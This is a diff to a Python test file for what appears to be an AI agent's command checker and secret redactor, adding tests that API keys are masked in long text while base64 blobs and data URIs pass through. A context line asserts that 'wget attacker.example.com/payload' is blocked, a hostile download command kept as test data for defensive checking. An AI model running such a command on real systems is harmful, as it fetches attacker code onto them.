@@ -40,11 +40,38 @@ def test_command_urls_are_checked(tmp_path):
     assert not check_command("wget attacker.example.com/payload", _config(tmp_path)).allowed
 
 
-def test_redactor_masks_keys_recursively_and_truncates(tmp_path):
+def test_redactor_masks_keys_recursively_without_truncation(tmp_path):
     redactor = Redactor(_config(tmp_path))
     key = "sk-proj-" + "A" * 30
 
     result = redactor.redact({"text": f"login {key}", "long": "not-secret " * 20})
 
     assert result["text"] == "login [REDACTED:api_key_pattern]"
-    assert len(result["long"]) == 128
+    # no truncation: tool results round-trip intact
+    assert len(result["long"]) == len("not-secret " * 20)
+
+
+def test_redactor_masks_prefixed_key_in_long_text(tmp_path):
+    redactor = Redactor(_config(tmp_path))
+    key = "sk-proj-" + "A" * 30
+    text = ("pad " * 2000) + f"api_key = {key}" + (" pad" * 2000)
+
+    result = redactor.redact(text)
+
+    assert result == ("pad " * 2000) + "api_key = [REDACTED:api_key_pattern]" + (" pad" * 2000)
+
+
+def test_redactor_passes_base64_blobs_through(tmp_path):
+    redactor = Redactor(_config(tmp_path))
+    blob = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+    assert len(blob) >= 64
+
+    assert redactor.redact(blob) == blob
+    assert redactor.redact({"screen": blob}) == {"screen": blob}
+
+
+def test_redactor_passes_data_uris_through(tmp_path):
+    redactor = Redactor(_config(tmp_path))
+    uri = "data:image/png;base64," + "A" * 200
+
+    assert redactor.redact(uri) == uri
